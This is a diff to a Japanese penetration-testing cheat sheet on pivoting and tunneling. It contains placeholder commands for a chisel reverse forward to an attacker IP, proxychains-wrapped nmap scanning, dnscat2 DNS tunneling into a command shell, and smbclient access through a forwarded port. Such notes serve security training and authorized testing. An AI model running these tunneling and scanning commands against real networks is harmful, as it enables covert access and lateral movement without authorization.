@@ -71,9 +71,11 @@ chisel client <attacker_IP>:<bind_port> R:<dest_port>:<target_IP>:<port> &
 6. 攻撃者のマシンから目的の操作をする
 ```sh
 # Nmap
-sudo proxychains nmap -sT -p- -Pn -n <target_IP> [2>/dev/null]
+sudo proxychains nmap -sT -p- -Pn -n <target_IP>
 ```
 - SOCK経由のSSHアクセスの場合：[22 - SSH](../../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
+- socksを使うときは `/etc/proxychains4.con`に`socks5 127.0.0.1 1080`の設定を入れること
+- Proxychains は sudo と一緒に使う
 
 >[!TIP]
 >`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする。
@@ -336,7 +338,7 @@ dnscat2-server <domain>
 ```zsh
 ./dnscat <domain>
 ```
-- →接続が確立すると、dnscat2 clientに"Session established!"と出力
+- 接続が確立すると、dnscat2 clientに"Session established!"と出力
 
 3. 権威サーバー上でdnscat2コマンドシェルを使用（`dnscat2>`プロンプト）
 ```zsh
@@ -347,11 +349,11 @@ windows
 window -i 1
 
 # listenコマンド(SSH -Lと同様）でローカルポートフォワーディング
-listen 0.0.0.0:[リッスンポート(1025以上任意)] [DestIP]:[Port]
+listen 0.0.0.0:<listen_port> <target_IP>:<port>
 ```
 
 4. 攻撃者のマシンからリッスンポートにアクセスし任意の操作をする
 ```zsh
 # 例：smbclientの場合
-smbclient -U victim --password=victimpass -p [リッスンポート] -L //[権威サーバーIP]/
+smbclient -U <username> --password=<password> -p <listen_port> -L //<権威サーバーIP>/
 ```
